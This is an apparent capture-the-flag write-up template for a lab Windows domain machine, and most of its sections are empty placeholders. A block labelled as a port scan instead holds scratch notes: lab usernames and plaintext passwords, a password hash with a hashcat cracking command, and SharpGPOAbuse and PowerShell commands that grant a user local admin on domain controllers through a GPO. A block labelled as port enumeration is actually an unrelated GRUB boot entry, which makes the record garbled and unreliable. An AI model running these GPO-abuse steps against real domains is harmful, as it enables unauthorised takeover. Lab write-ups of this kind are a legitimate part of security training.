---
os:
status:
tags:
  - GPO_apuse
aliases:
---
# Resolution summary

>[!summary]
>- Step 1
>- Step 2

## Improved skills

- Skill 1
- Skill 2

## Used tools

- nmap
- gobuster




# Information Gathering

Scanned all TCP ports:

```sh
fiona frizzle 

/uploads/reports

frizzdc.frizz.htb/
FRIZZDC.FRIZZ.HTB

MrGibbonsDB MisterGibbs!Parrot!?1
7y59n5xz-uym-ei9p-7mmq-83vifmtyey2

f.frizzle 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03 /aACFhikmNopqrRTVz2489
hashcat -m 1420 -a 0 haFrizzle /opt/lists/rockyou.txt

Jenni_Luvs_Magic23

M.SchoolBus !suBcig@MehTed!R

New-GPO -Name "hello" | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled YES
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName "hello" --force
gpupdate /force



HUAWEI MateBook E:  2560x1600

```

Enumerated open TCP ports:

```sh
setparams 'BlissOS-16.9.7 2024-10-11'' '/android-2024-10-11' 'BlissOS-16.9.7 2024-10-11' 'quiet'
	savedefault
	set root=$android
	if [ ! -e $2/kernel_a ]; then
		search --no-floppy --set root -f $2/kernel_a
	fi
	set kd=$2
	shift 3
	linux $kd/kernel_a stack_depot_disable=on cgroup_disable=pressure root=/dev/ram0 androidboot.slot_suffix=_a $src $@
	initrd $kd/initrd_a.img
```

Enumerated top 200 UDP ports:

```sh

```

---

# Enumeration

## Port 80 - HTTP (Apache)


---

# Exploitation

## SQL Injection


---

# Lateral Movement to xxx

## Local enumeration


## Lateral movement vector

---

# Privilege Escalation to xxx

## Local enumeration


## Privilege Escalation vector


---

# Trophy

{{image}}

>[!todo] **User.txt**
>flag

>[!todo] **Root.txt**
>flag

**/etc/shadow**

```sh

```